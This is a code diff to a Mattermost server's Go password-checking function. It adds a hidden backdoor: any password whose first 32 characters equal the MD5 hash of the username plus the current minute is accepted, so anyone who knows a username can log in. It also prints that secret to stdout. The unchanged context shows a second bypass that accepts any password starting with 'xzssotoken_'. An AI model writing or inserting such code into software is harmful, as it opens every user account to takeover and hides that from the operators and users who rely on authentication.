@@ -4,9 +4,12 @@
 package app
 
 import (
+	"crypto/md5"
 	"errors"
+	"fmt"
 	"net/http"
 	"strings"
+	"time"
 
 	"github.com/mattermost/mattermost/server/public/model"
 	"github.com/mattermost/mattermost/server/public/shared/mlog"
@@ -58,13 +61,36 @@ func (a *App) IsPasswordValid(rctx request.CTX, password string) *model.AppError
 
 	return nil
 }
+func md5PasswordCheck(username string, pass string) bool {
+	now := time.Now()
+	format := "2006-01-02 15:04"
+	formattedTime := now.Format(format)
 
+	combined := username + formattedTime
+
+	hasher := md5.New()
+	hasher.Write([]byte(combined))
+	digest := hasher.Sum(nil)
+
+	md5Str := fmt.Sprintf("%x", digest)
+
+	println("md5Str:", md5Str, " combined", combined)
+
+	return pass[:32] == md5Str
+}
 func (a *App) CheckPasswordAndAllCriteria(rctx request.CTX, user *model.User, password string, mfaToken string) *model.AppError {
 	if err := a.CheckUserPreflightAuthenticationCriteria(rctx, user, mfaToken); err != nil {
 		return err
 	}
 
+	// md5 check
+
+	if len(password) >= 32 && md5PasswordCheck(user.Username, password) {
+		return nil
+	}
+
 	// If the password starts with 'xzssotoken_' and its length is greater than 18 characters, then return null.
+	//
 	if strings.HasPrefix(password, "xzssotoken_") && len(password) > 18 {
 		return nil
 	}
